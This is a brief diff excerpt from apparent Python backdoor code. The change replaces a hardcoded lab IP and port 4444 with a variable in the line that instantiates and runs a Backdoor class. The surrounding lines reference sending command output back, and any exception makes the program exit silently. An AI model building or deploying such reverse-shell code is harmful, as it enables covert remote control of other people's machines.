@@ -82,7 +82,7 @@ class Backdoor:
 				# self.reliable_send(command_result.decode())
 			# self.reliable_send(command_result)
 try:
-	my_backdoor = Backdoor("10.0.2.15", 4444)
+	my_backdoor = Backdoor(my_ip, 4444)
 	my_backdoor.run()
 except Exception:
 	sys.exit()
